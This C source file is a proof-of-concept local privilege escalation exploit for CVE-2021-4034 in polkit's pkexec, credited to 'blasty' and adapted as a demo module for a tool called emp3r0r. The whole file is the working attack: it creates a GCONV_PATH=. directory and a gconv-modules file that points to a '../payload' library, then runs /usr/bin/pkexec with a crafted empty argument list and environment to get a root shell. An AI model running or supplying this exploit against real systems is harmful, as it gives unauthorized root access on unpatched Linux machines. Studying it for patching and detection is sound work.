/*
 * blasty-vs-pkexec.c -- by blasty <peter@haxx.in>
 * ------------------------------------------------
 * PoC for CVE-2021-4034, shout out to Qualys
 *
 * ctf quality exploit
 *
 * bla bla irresponsible disclosure
 *
 * -- blasty // 2022-01-25
 *
 * Adapted for emp3r0r
 * -------------------
 *
 * This is merely a demo, it will be rewritten in Go and used as
 * a built-in module in emp3r0r
 * -- jm33-ng // 2022-01-27
 */

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

void fatal(char* f)
{
    perror(f);
    exit(-1);
}

int main(int argc, char* argv[])
{
    struct stat st;
    char* a_argv[] = { NULL };
    char* a_envp[] = {
        "lol",
        "PATH=GCONV_PATH=.",
        "LC_MESSAGES=en_US.UTF-8",
        "XAUTHORITY=../LOL",
        NULL
    };

    if (stat("GCONV_PATH=.", &st) < 0) {
        if (mkdir("GCONV_PATH=.", 0777) < 0) {
            fatal("mkdir");
        }
        int fd = open("GCONV_PATH=./lol", O_CREAT | O_RDWR, 0777);
        if (fd < 0) {
            fatal("open");
        }
        close(fd);
    }

    if (stat("lol", &st) < 0) {
        if (mkdir("lol", 0777) < 0) {
            fatal("mkdir");
        }
        FILE* fp = fopen("lol/gconv-modules", "wb");
        if (fp == NULL) {
            fatal("fopen");
        }
        fprintf(fp, "module  UTF-8//    INTERNAL    ../payload    2\n");
        /*
            Returning to the example above where one has written a module to directly convert from ISO-2022-JP to EUC-JP and back. All that has to be done is to put the new module, let its name be `ISO2022JP-EUCJP.so`, in a directory and add a file gconv-modules with the following content in the same directory:

            module  ISO-2022-JP//   EUC-JP//        ISO2022JP-EUCJP    1
            module  EUC-JP//        ISO-2022-JP//   ISO2022JP-EUCJP    1
        */
        fclose(fp);
    }

    printf("[~] maybe get shell now?\n");

    execve("/usr/bin/pkexec", a_argv, a_envp);
}
